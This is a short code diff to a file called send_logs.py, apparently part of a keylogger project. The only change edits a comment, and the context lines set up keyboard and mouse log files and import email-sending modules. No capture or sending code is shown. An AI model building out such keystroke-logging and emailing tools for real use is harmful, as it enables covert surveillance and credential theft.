@@ -2,7 +2,7 @@ import smtplib
 from email.message import EmailMessage
 
 # Will create new log files if User uses program for first time!
-# Not in main.py, since this file (send_logs.py) is imported first.
+# Not in client_side.py, since this file (send_logs.py) is imported first.
 open("Key_logs/mouse_logs.txt", "w")
 open("Key_logs/keyboard_logs.txt", "w")
 
